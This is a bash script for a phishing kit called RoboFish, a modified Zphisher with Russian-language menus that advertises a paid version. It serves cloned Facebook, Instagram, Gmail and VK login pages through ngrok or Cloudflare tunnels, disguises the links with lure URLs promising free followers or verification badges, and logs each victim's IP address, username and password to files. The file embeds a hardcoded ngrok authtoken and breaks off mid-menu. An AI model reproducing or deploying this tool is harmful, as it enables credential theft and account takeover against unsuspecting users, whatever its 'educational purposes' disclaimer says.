#!/bin/bash

##   Zphisher 	: 	Automated Phishing Tool
##   Author 	: 	TAHMID RAYAT 
##   Version 	: 	2.2
##   Github 	: 	https://github.com/htr-tech

##   THANKS TO :
##   Aditya Shakya - https://github.com/adi1090x
##   1RaY-1 - https://github.com/1RaY-1
##   Moises Tapia - https://github.com/MoisesTapia
##   TheLinuxChoice - https://twitter.com/linux_choice
##   DarksecDevelopers  - https://github.com/DarksecDevelopers
##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##   Võ Ngọc Bảo - https://github.com/vongocbao
##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009


## If you Copy Then Give the credits :)



##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2021  HTR-TECH (https://github.com/htr-tech)
##


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Banner
banner() {
	cat <<- EOF

                        $BLACK$WHITEBG   -:**++++**:- $RESETBG 
                   $BLACK$WHITEBG :=%=+:               -*=%+- $RESETBG 
              $BLACK$WHITEBG -=%*        =#########+         +=- $RESETBG 
           $BLACK$WHITEBG -%+           +###########*          :%- $RESETBG
         $BLACK$WHITEBG *%-             :###########*            *= $RESETBG
       $BLACK$WHITEBG -%-    -          -###########:          -  -%- $RESETBG
      $BLACK$WHITEBG -%   -#####%-       ###########-      *@#####- %- $RESETBG
      $BLACK$WHITEBG %-  -#########@*    ###########    =##########: %- $RESETBG
     $BLACK$WHITEBG *+  -##############%*##########@ %##############: @ $RESETBG
     $BLACK$WHITEBG %   @###########################################+ -% $RESETBG
    $BLACK$WHITEBG *+    :=##################@@@##################+    +* $RESETBG
    $BLACK$WHITEBG =-        :%###########%--%@****###########%-        % $RESETBG
    $BLACK$WHITEBG @             :%#######@@##%+*#-:######%:            +: $RESETBG
   $BLACK$WHITEBG -=                @####%**:---@=--####%               := $RESETBG
   $BLACK$WHITEBG :+           -+#########:==+:-:*-=########+-           % $RESETBG
   $BLACK$WHITEBG :+        +##############%:=---*##############*        % $RESETBG
   $BLACK$WHITEBG :+     %#########################################=     % $RESETBG
   $BLACK$WHITEBG -=    =###########################################+   := $RESETBG
    $BLACK$WHITEBG %     ############%-  ##########@  :############@    =: $RESETBG
    $BLACK$WHITEBG =:     @#######=-     ###########     :@#######%    := $RESETBG
    $BLACK$WHITEBG :=      :@#@*        -###########-        +##@:    *+ $RESETBG $RED DISCLAIMER:
     $BLACK$WHITEBG =-         :@@+     -###########-              -+%-$RESETBG $RED Developers assume no liability and are not$BLACKBG
     $BLACK$WHITEBG -%     -=: *##% -+* -###########-          *%=:$RESETBG   $RED responsible for any misuse or damage   $BLACK
      $BLACK$WHITEBG :=    @###########: @##########       -==- $RESETBG    $RED caused by RoboPhish$BLACK
       $BLACK$WHITEBG :=     -@#=++#*     -*++++++:     :%+ $RESETBG     $MAGENTA RoboFish v.4.0 (lite)$BLACK
        $BLACK$WHITEBG -%- @###########-             :%+ $RESETBG     $GREEN Phishing Tool based on Zphisher.   $BLACK
          $BLACK$WHITEBG ++-=: *##% -=*           :%+ $RESETBG     $GREEN Coded by:  htr-tech$BLACK
            $BLACK$WHITEBG =+  -%@+            *@* $RESETBG    $GREEN upgraded by:  @gasayminajj$BLACK
              $BLACK$WHITEBG :%*           *%=- $RESETBG    $ORANGE For Pro Version contact @gasayminajj tg $BLACK
                  $BLACK$WHITEBG *=%%%%=+:$RESETBG        $RED For educational purposes only
	EOF
}
warningad() {
	clear
	cat <<- EOF
	Привет! Ты точно будешь использовать данный скрипт в образовательных целях? (Y\n)
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} #$: ${BLUE}"
	case $REPLY in 
		Y | y)
			main_menu;;
		N | n)
			exit 1;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; };;	
	esac
	clear
}
## Small Banner
banner_small() {
	cat <<- EOF

                        $BLACK$WHITEBG   -:**++++**:- $BLACKBG 
                   $BLACK$WHITEBG :=%=+:               -*=%+- $BLACKBG 
              $BLACK$WHITEBG -=%*        =#########+         +=- $BLACKBG 
           $BLACK$WHITEBG -%+           +###########*          :%- $BLACKBG
         $BLACK$WHITEBG *%-             :###########*            *= $BLACKBG
       $BLACK$WHITEBG -%-    -          -###########:          -  -%- $BLACKBG
      $BLACK$WHITEBG -%   -#####%-       ###########-      *@#####- %- $BLACKBG
      $BLACK$WHITEBG %-  -#########@*    ###########    =##########: %- $BLACKBG
     $BLACK$WHITEBG *+  -##############%*##########@ %##############: @ $BLACKBG
     $BLACK$WHITEBG %   @###########################################+ -% $BLACKBG
    $BLACK$WHITEBG *+    :=##################@@@##################+    +* $BLACKBG
    $BLACK$WHITEBG =-        :%###########%--%@****###########%-        % $BLACKBG
    $BLACK$WHITEBG @             :%#######@@##%+*#-:######%:            +: $BLACKBG
   $BLACK$WHITEBG -=                @####%**:---@=--####%               := $BLACKBG
   $BLACK$WHITEBG :+           -+#########:==+:-:*-=########+-           % $BLACKBG
   $BLACK$WHITEBG :+        +##############%:=---*##############*        % $BLACKBG
   $BLACK$WHITEBG :+     %#########################################=     % $BLACKBG
   $BLACK$WHITEBG -=    =###########################################+   := $BLACKBG
    $BLACK$WHITEBG %     ############%-  ##########@  :############@    =: $BLACKBG
    $BLACK$WHITEBG =:     @#######=-     ###########     :@#######%    := $BLACKBG
    $BLACK$WHITEBG :=      :@#@*        -###########-        +##@:    *+ $BLACKBG $RED DISCLAIMER:
     $BLACK$WHITEBG =-         :@@+     -###########-              -+%-$BLACKBG $RED Developers assume no liability and are not$BLACKBG
     $BLACK$WHITEBG -%     -=: *##% -+* -###########-          *%=:$BLACKBG   $RED responsible for any misuse or damage   $BLACK
      $BLACK$WHITEBG :=    @###########: @##########       -==- $BLACKBG    $RED caused by RoboPhish$BLACK
       $BLACK$WHITEBG :=     -@#=++#*     -*++++++:     :%+ $BLACKBG     $MAGENTA RoboFish v.4.0 (lite)$BLACK
        $BLACK$WHITEBG -%- @###########-             :%+ $BLACKBG     $GREEN Phishing Tool based on Zphisher.   $BLACK
          $BLACK$WHITEBG ++-=: *##% -=*           :%+ $BLACKBG     $GREEN Coded by:  htr-tech$BLACK
            $BLACK$WHITEBG =+  -%@+            *@* $BLACKBG    $GREEN upgraded by:  @gasayminajj$BLACK
              $BLACK$WHITEBG :%*           *%=- $BLACKBG    $ORANGE For Pro Version contact @gasayminajj tg $BLACK
                  $BLACK$WHITEBG *=%%%%=+:$BLACKBG        $RED For educational purposes only
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Download Cloudflared
download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
		${GREEN}ReBuilder${RED}:  ${ORANGE}Gasay ${RED}[ ${ORANGE}GASAYMINAJJ ${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/gasayminajj
		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
		${GREEN}Social   ${RED}:  ${CYAN}https://t.me/gasayminajj
		${GREEN}Telegram Chanel   ${RED}:  ${CYAN}https://t.me/gasaysecure
		${GREEN}Version  ${RED}:  ${ORANGE}4.0 LITE
		${RED}!!! Чтобы купить полную версию - напишите мне https://t.me/gasayminajj !!!

		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice,DarkSecDevelopers,Mustakim Ahmed,1RaY-1, htr-tech ${BLACKBG}

		${RED}Warning:${WHITE}
		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
		
		${RED}Предупреждение:${WHITE}
		${CYAN}Этот инструмент предназначен только для образовательных целей! ${RED}!${WHITE}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf sites/"$website"/* .server/www
	cp -f sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Account:.*' password.txt | cut -d ":" -f2)
	PASSWORD=$(grep -o 'Pass:.*' password.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat password.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e "password.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf password.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
	sleep 2 && termux-chroot ./.server/ngrok authtoken 23BZ8zTkDPntJEZ7ZP6QUtdyvnA_5qSntEQTMfDYn3e9wKsQy > /dev/null 2>&1 &
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/ngrok authtoken 23BZ8zTkDPntJEZ7ZP6QUtdyvnA_5qSntEQTMfDYn3e9wKsQy > /dev/null 2>&1 &
	sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}


## DON'T COPY PASTE WITHOUT CREDIT DUDE :')

## Start Cloudflared
start_cloudflared() { 
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
		${RED}[${WHITE}00${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Временно не работает${RED}]

	EOF


	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		7 | 07)
			start_ngrok;;
		2 | 02)
			start_cloudflared;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="vkcoin"
			mask='http://vkcoin-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='http://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='http://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='http://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='http://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='http://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='http://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Vk
site_vk() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="vk"
			mask='http://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Vk Coin      	          ${RED}[${WHITE}11${RED}]${ORANGE} Магазин 
		${RED}[${WHITE}02${RED}]${ORANGE} Подарки                      ${RED}[${WHITE}12${RED}]${ORANGE} PUBG раздача
		${RED}[${WHITE}03${RED}]${ORANGE} Стикеры                      ${RED}[${WHITE}13${RED}]${ORANGE} KFC 
		${RED}[${WHITE}04${RED}]${ORANGE} Стикеры2(лучший вариант)     ${RED}[${WHITE}14${RED}]${ORANGE} Голоса VK  	
		${RED}[${WHITE}05${RED}]${ORANGE} Стикеры3(Doesn't work!)      ${RED}[${WHITE}15${RED}]${ORANGE} Бесплатные стикеры     	
		${RED}[${WHITE}06${RED}]${ORANGE} BOOM	                  ${RED}[${WHITE}16${RED}]${ORANGE}Закрытая группа(Need some customize!) 
		${RED}[${WHITE}07${RED}]${ORANGE} Oбычная авторизация#1	  ${RED}[${WHITE}17${RED}]${ORANGE} Читы 		
		${RED}[${WHITE}08${RED}]${ORANGE} Голосование #1	          ${RED}[${WHITE}18${RED}]${ORANGE} Петиции(Custom)    
		${RED}[${WHITE}09${RED}]${ORANGE} Ответы	                  ${RED}[${WHITE}19${RED}]${ORANGE} Алиэкспресс      
		${RED}[${WHITE}10${RED}]${ORANGE} Накрутка        


		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="vkcoin"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		2 | 02)
			website="hiki"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		3 | 03)
			website="reoil"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		4 | 04)
			website="siol"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		5 | 05)
			website="stikj"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		6 | 06)
			website="boom"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		7 | 07)
			website="boom/vk"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		8 | 08)
			website="vote7241"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		9 | 09)
			website="otvets"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		10)
			website="nakrutka"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		11)
			website="magazine"
